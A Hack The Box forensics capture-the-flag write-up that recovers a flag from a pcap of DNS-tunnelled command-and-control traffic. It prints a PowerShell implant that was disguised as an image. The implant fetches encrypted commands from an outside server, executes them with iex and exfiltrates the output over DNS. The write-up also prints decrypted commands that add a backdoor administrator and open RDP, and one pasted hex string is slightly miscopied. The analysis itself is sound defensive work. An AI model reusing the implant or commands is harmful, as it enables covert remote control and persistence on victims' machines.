# HTB Forensics Automation

This challenge is about extracting encoded information in a Wireshark pcap network dump file,
where the scenario is that a host on the network has been infected with a command/control malware and has been sending suspicious network traffic.
We have been given a pcap which contains some of this type of malicious traffic.


<p align="center">
  <img src="https://i.imgur.com/OZm11OK.png" />
</p>

Checking in Analyze -> Export Information, there is a few items which are a little suspicious. Generally, Export Information tells us about stuff that's 'wrong' in the the pcap or otherwise out of the ordinary. Two items of note here, the DNS retransmission and a malformed HTTP png that the Wireshark dissector didn't manage to figure out what it actually was.

<p align="center">
  <img src="https://i.imgur.com/aozXol7.png" />
</p>

Investigating the malformed HTTP image first, we choose File -> Export Objects -> HTTP and check what the contents of the packet actually is...

<p align="center">
  <img src="https://i.imgur.com/xV4PK93.png" />
</p>

It appears the image is not an image at all, furthermore, the domain that the 'image' is being collected from appears to be a privately owned domain purchased via namecheap, attempting to obfuscate any forensics by pretending to be a Microsoft service...
```
whois windowsliveupdater.com
....
The Registry database contains ONLY .COM, .NET, .EDU domains and
Registrars.
Domain name: windowsliveupdater.com
Registry Domain ID: 2612912575_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.namecheap.com
Registrar URL: http://www.namecheap.com
Updated Date: 2022-05-10T15:59:18.29Z
Creation Date: 2021-05-17T18:42:28.00Z
Registrar Registration Expiration Date: 2023-05-17T18:42:28.00Z
Registrar: NAMECHEAP INC
Registrar IANA ID: 1068
Registrar Abuse Contact Email: abuse@namecheap.com
Registrar Abuse Contact Phone: +1.9854014545
Reseller: NAMECHEAP INC
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
```

Looking at the binary data of the image, it looks like base64, specifically because of the two equals signs at the end of the character stream.

```
ZnVuY3Rpb24gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QoJGtleSwgJElWKSB7CiAgICAkYWVzTWFuYWdlZCA9IE5ldy1PYmplY3QgIlN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzTWFuYWdlZCIKICAgICRhZXNNYW5hZ2VkLk1vZGUgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DaXBoZXJNb2RlXTo6Q0JDCiAgICAkYWVzTWFuYWdlZC5QYWRkaW5nID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpaZXJvcwogICAgJGFlc01hbmFnZWQuQmxvY2tTaXplID0gMTI4CiAgICAkYWVzTWFuYWdlZC5LZXlTaXplID0gMjU2CiAgICBpZiAoJElWKSB7CiAgICAgICAgaWYgKCRJVi5nZXRUeXBlKCkuTmFtZSAtZXEgIlN0cmluZyIpIHsKICAgICAgICAgICAgJGFlc01hbmFnZWQuSVYgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRJVikKICAgICAKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRhZXNNYW5hZ2VkLklWID0gJElWCiAgICAgCgogICAgICAgIH0KICAgIH0KICAgIGlmICgka2V5KSB7CgogICAgICAgIGlmICgka2V5LmdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIikgewogICAgICAgICAgICAkYWVzTWFuYWdlZC5LZXkgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRrZXkpCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkYWVzTWFuYWdlZC5LZXkgPSAka2V5CiAgICAgICAgfQogICAgfQogICAgJGFlc01hbmFnZWQKfQoKZnVuY3Rpb24gQ3JlYXRlLUFlc0tleSgpIHsKICAKICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleSAkSVYKICAgIFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRhZXNNYW5hZ2VkLktleSkKfQoKZnVuY3Rpb24gRW5jcnlwdC1TdHJpbmcoJGtleSwgJHVuZW5jcnlwdGVkU3RyaW5nKSB7CiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR1bmVuY3J5cHRlZFN0cmluZykKICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleQogICAgJGVuY3J5cHRvciA9ICRhZXNNYW5hZ2VkLkNyZWF0ZUVuY3J5cHRvcigpCiAgICAkZW5jcnlwdGVkRGF0YSA9ICRlbmNyeXB0b3IuVHJhbnNmb3JtRmluYWxCbG9jaygkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpOwogICAgW2J5dGVbXV0gJGZ1bGxEYXRhID0gJGFlc01hbmFnZWQuSVYgKyAkZW5jcnlwdGVkRGF0YQogICAgJGFlc01hbmFnZWQuRGlzcG9zZSgpCiAgICBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRmdWxsRGF0YSkucmVwbGFjZSgiLSIsIiIpCn0KCmZ1bmN0aW9uIERlY3J5cHQtU3RyaW5nKCRrZXksICRlbmNyeXB0ZWRTdHJpbmdXaXRoSVYpIHsKICAgICRieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGVuY3J5cHRlZFN0cmluZ1dpdGhJVikKICAgICRJViA9ICRieXRlc1swLi4xNV0KICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleSAkSVYKICAgICRkZWNyeXB0b3IgPSAkYWVzTWFuYWdlZC5DcmVhdGVEZWNyeXB0b3IoKTsKICAgICR1bmVuY3J5cHRlZERhdGEgPSAkZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJGJ5dGVzLCAxNiwgJGJ5dGVzLkxlbmd0aCAtIDE2KTsKICAgICRhZXNNYW5hZ2VkLkRpc3Bvc2UoKQogICAgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJHVuZW5jcnlwdGVkRGF0YSkuVHJpbShbY2hhcl0wKQp9CgpmaWx0ZXIgcGFydHMoJHF1ZXJ5KSB7ICR0ID0gJF87IDAuLlttYXRoXTo6Zmxvb3IoJHQubGVuZ3RoIC8gJHF1ZXJ5KSB8ICUgeyAkdC5zdWJzdHJpbmcoJHF1ZXJ5ICogJF8sIFttYXRoXTo6bWluKCRxdWVyeSwgJHQubGVuZ3RoIC0gJHF1ZXJ5ICogJF8pKSB9fSAKJGtleSA9ICJhMUU0TVV0eWNXc3dUbXRyTUhkcWRnPT0iCiRvdXQgPSBSZXNvbHZlLURuc05hbWUgLXR5cGUgVFhUIC1EbnNPbmx5IHdpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODl8U2VsZWN0LU9iamVjdCAtUHJvcGVydHkgU3RyaW5nczsKZm9yICgkbnVtID0gMCA7ICRudW0gLWxlICRvdXQuTGVuZ3RoLTI7ICRudW0rKyl7CiRlbmNyeXB0ZWRTdHJpbmcgPSAkb3V0WyRudW1dLlN0cmluZ3NbMF0KJGJhY2tUb1BsYWluVGV4dCA9IERlY3J5cHQtU3RyaW5nICRrZXkgJGVuY3J5cHRlZFN0cmluZwokb3V0cHV0ID0gaWV4ICRiYWNrVG9QbGFpblRleHQ7JHByID0gRW5jcnlwdC1TdHJpbmcgJGtleSAkb3V0cHV0fHBhcnRzIDMyClJlc29sdmUtRG5zTmFtZSAtdHlwZSBBIC1EbnNPbmx5IHN0YXJ0LndpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKZm9yICgkYW5zID0gMDsgJGFucyAtbHQgJHByLmxlbmd0aC0xOyAkYW5zKyspewokZG9tYWluID0gLWpvaW4oJHByWyRhbnNdLCIud2luZG93c2xpdmV1cGRhdGVyLmNvbSIpClJlc29sdmUtRG5zTmFtZSAtdHlwZSBBIC1EbnNPbmx5ICRkb21haW4gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKICAgIH0KUmVzb2x2ZS1EbnNOYW1lIC10eXBlIEEgLURuc09ubHkgZW5kLndpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKfQ==
```
 
Sure enough, decoding this as a Base64 string yields the following powershell script.

```powershell
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
     
        }
        else {
            $aesManaged.IV = $IV
     

        }
    }
    if ($key) {

        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {
  
    $aesManaged = Create-AesManagedObject $key $IV
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.BitConverter]::ToString($fullData).replace("-","")
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }} 
$key = "a1E4MUtycWswTmtrMHdqdg=="
$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
for ($num = 0 ; $num -le $out.Length-2; $num++){
$encryptedString = $out[$num].Strings[0]
$backToPlainText = Decrypt-String $key $encryptedString
$output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32
Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
for ($ans = 0; $ans -lt $pr.length-1; $ans++){
$domain = -join($pr[$ans],".windowsliveupdater.com")
Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
    }
Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
}
```

## Obtaining the first half of the flag

It appears the AES key used is a1E4MUtycWswTmtrMHdqdg== (kQ81Krqk0Nkk0wjv), which is exactly 16 characters - we're working with a 128 bit AES key, but the script itself seems to ask for a 256 bit key... Also, it appears that the first 16 bytes of each message is likely to be an AES initialization vector, as this can be gathered from the 'Decrypt-String' function which contains the following statement:

```powershell
$IV = $bytes[0..15]
```

In addition to this, we can gather from the exctracted powershell code that commands appear to be sent via DNS TXT records which are then decrypted and executed with Invoke-Expression (iex), the output is then encrypted and split into parts which is then exfiltrated via DNS queries.
```powershell
$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
....
$output = iex $backToPlainText
$pr = Encrypt-String $key $output|parts 32
```

Examining the pcap further, you can find excessive DNS queries with supicious domain names which almost look like encoded data exfiltration. In the beginning, there appears to be a large query containing several TXT records which appear to be answered in Base64 encoding, which matches the observations made in the decoded PowerShell script.

Modifying the script to decrypt rather than execute, I created the following script containing the Base64 encoded strings in the TXT records to be decrypted.

```powershell
$key = "a1E4MUtycWswTmtrMHdqdg=="
$out = "Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=",
'hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=', 
'58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=', 'eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru',
'BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=',
'vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=',
'M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh'
for ($num = 0 ; $num -le $out.Length - 2; $num++) {
    $encryptedString = $out[$num]
    $backToPlainText = Decrypt-String $key $encryptedString
    Write-Host $backToPlainText
}
```

Output:

```cmd
hostname
whoami
ipconfig
wmic /namespace:\\root\SecurityCenter PATH AntiVirusProduct GET /value
net user DefaultUsr "JHBhcnQxPSdIVEJ7eTB1X2M0bl8n" /add /Y; net localgroup Administrators /add DefaultUsr; net localgroup "Remote Desktop Users" /add DefaultUsr
netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389
```

Since we're just hunting Base64 at this point... the created DefaultUsr string decodes from base64 into "$part1='HTB{y0u_c4n_'", which is the first part of the flag. The remainder can likely be found in the additional DNS queries where data exfiltration appear to be taking place in the hostnames.

## Obtaining the second part of the flag

Reading the Encrypt-String function, it also appears that the output of it is converting from what is likely to be Base64 into hex, so let's convert this back and put the newly gathered base64 strings into the decryptor function. From there, it is just a matter of putting all the hexes into powershell (manually, eugh) and then converting, then decrypting.


### Partially automating getting the hexes
We can partially automate getting the encoded and encrypted data from the domain names, tshark allows us to gather domain names directly:


```bash
tshark -Y 'ip.addr == 147.182.172.189 and dns.qry.name != ""' -Tfields -e dns.qry.name -r capture.pcap | cut -d. -f 1 | uniq
```

This yields the following output:
```
windowsliveupdater
start
CC1C9AC2958A2E63609272E2B4F8F436
32A806549B03AB7E4EB39771AEDA4A1B
C1006AC8A03F9776B08321BD6D5247BB
end
start
7679895D1CF7C07BB6A348E1AA4AFC65
5958A6856F1A34AAD5E97EA55B087670
35F2497E5836EA0ECA1F1280F59742A3
end
start
09E28DD82C14BC32513652DAC2F2C27B
0D73A3288A980D8FCEF94BDDCF9E2822
2A1CA17BB2D90FCD6158856348790414
20FC39C684A9E371CC3A06542B666005
5840BD94CCE65E23613925B4D9D2BA53
18EA75BC653004D45D505ED62567017A
6FA4E7593D83092F67A81082D9930E99
BA20E34AACC4774F067442C6622F5DA2
A9B09FF558A8DF000ECBD37804CE663E
3521599BC7591005AB6799C57068CF0D
C6884CECF01C0CD44FD6B82DB788B35D
62F02E4CAA1D973FBECC235AE9F40254
C63D3C93C89930DA2C4F42D9FC123D8B
AB00ACAB5198AFCC8C6ACD81B19CD264
CC6353668CEA4C88C8AEEA1D58980022
DA8FA2E917F17C28608818BF550FEA66
973B5A8355258AB0AA281AD88F5B9EB1
03AC666FE09A1D449736335C09484D27
1C301C6D5780AB2C9FA333BE3B0185BF
071FB1205C4DBEAA2241168B0748902A
6CE14903C7C47E7C87311044CB9873A4
end
start
ECABC349D27C0B0FFFD1ACEEDBE06BB6
C2EB000EE4F9B35D6F001500E85642A2
DCC8F1BE2CF4D667F458C1DE46D24B1C
2E0F5D94E52649C70402C1B0A2FF7B49
FC32DDD67F275307A74B2C4D0864B3F0
486186DA9443EB747F717B3911C959DC
7E300844D60655410C3988238E615D61
6F33D27F63CE4D1E065A416911BC50D4
58749599D2CB08DB561988EB2902E05D
9886FDDAC2BED6F6DA73637AD2F20CF1
99B8CE3D9DEE03C0180C7D1198B49C02
769E5EE4EAB896D7D3BB478EA1408167
79472A243BFB0852AF372323EC132988
3C81A3F2AEB1D3DAAE8496E1DBF97F43
5AE40A09203B890C4A174D77CB7026C4
E990A6FB6424A7501823AD31D3D6B634
4C7971C8D447C078C4471732AD881C39
4BC8B1A66E0BED43DDC359269B57D1D5
D68DCD2A608BF61716BB47D6FE4D5C9D
6E8BB2981F214A8234B0DD0210CA96EB
2D6322B0F7F3D748C4C9F8B80EFF5A69
21A3D1A8621A49F4D29BC9851D25230B
end
start
841BDB4E9E5F8BF721B58E8308177B57
2E9A015967DA5BF11AC9155FC2159C8F
610CD82F818B4BDF5E48722DAF4BEEEB
ABCE30583F503B484BF99020E28A1B8F
282A23FEB3A21C3AD89882F5AC0DD3D5
7D87875231652D0F4431EC37E51A09D5
7E2854D11003AB6E2F4BFB4F7E2477DA
A44FCA3BC6021777F03F139D458C0524
end
start
AE4ABE8A3A88D21DEEA071A72D65A35E
F158D9F025897D1843E37B7463EC7833
end
```

From here, we can either copy the hexes into the program manually, or continue with trying to automate it. 

```powershell
$key = "a1E4MUtycWswTmtrMHdqdg=="
$hexes = "CC1C9AC2958A2E63609272E2B4F8F43632A806549B03AB7E4EB39771AEDA4A1BC1006AC8A03F9776B08321BD6D5247BB",
"7679895D1CF7C07BB6A348E1AA4AFC655958A6856F1A34AAD5E97EA55B08767035F2497E5836EA0ECA1F1280F59742A3",
"09E28DD82C14BC32513652DAC2F2C27B0D73A3288A980D8FCEF94BDDCF9E28222A1CA17BB2D90FCD615885634879041420FC39C684A9E371CC3A06542B6660055840BD94CCE65E23613925B4D9D2BA5318EA75BC653004D45D505ED62567017A6FA4E7593D83092F67A81082D9930E99BA20E34AACC4774F067442C6622F5DA2A9B09FF558A8DF000ECBD37804CE663E3521599BC7591005AB6799C57068CF0DC6884CECF01C0CD44FD6B82DB788B35D62F02E4CAA1D973FBECC235AE9F40254C63D3C93C89930DA2C4F42D9FC123D8BAB00ACAB5198AFCC8C6ACD81B19CD264CC6353668CEA4C88C8AEEA1D58980022DA8FA2E917F17C28608818BF550FEA66973B5A8355258AB0AA281AD88F5B9EB103AC666FE09A1D449736335C09484D271C301C6D5780AB2C9FA333BE3B0185BF071FB1205C4DBEAA2241168B0748902A6CE14903C7C47E7C87311044CB9873A4",
"ECABC349D27C0B0FFFD1ACEEDBE06BB6C2EB000EE4F9B35D6F001500E85642A2DCC8F1BE2CF4D667F458C1DE46D24B1C2E0F5D94E52649C70402C1B0A2FF7B49FC32DDD67F275307A74B2C4D0864B3F0486186DA9443EB747F717B3911C959DC7E300844D60655410C3988238E615D616F33D27F63CE4D1E065A416911BC50D46F33D27F63CE4D1E065A416911BC50D49886FDDAC2BED6F6DA73637AD2F20CF199B8CE3D9DEE03C0180C7D1198B49C02769E5EE4EAB896D7D3BB478EA140816779472A243BFB0852AF372323EC1329883C81A3F2AEB1D3DAAE8496E1DBF97F435AE40A09203B890C4A174D77CB7026C4E990A6FB6424A7501823AD31D3D6B6344C7971C8D447C078C4471732AD881C394BC8B1A66E0BED43DDC359269B57D1D5D68DCD2A608BF61716BB47D6FE4D5C9D6E8BB2981F214A8234B0DD0210CA96EB2D6322B0F7F3D748C4C9F8B80EFF5A6921A3D1A8621A49F4D29BC9851D25230B"
$outItems = New-Object System.Collections.Generic.List[System.Object]
foreach ($hex in $hexes) {
    $numbers = [System.Convert]::FromHexString($hex)
    $outItems.Add([System.Convert]::ToBase64String($numbers))
}
for ($num = 0 ; $num -lt $outItems.Count; $num++) {
    $backToPlainText = Decrypt-String $key $outItems[$num]
    Write-Host $backToPlainText
}
```


This finally yields the last part of the key, "$part2=4utom4t3_but_y0u_c4nt_h1de}"

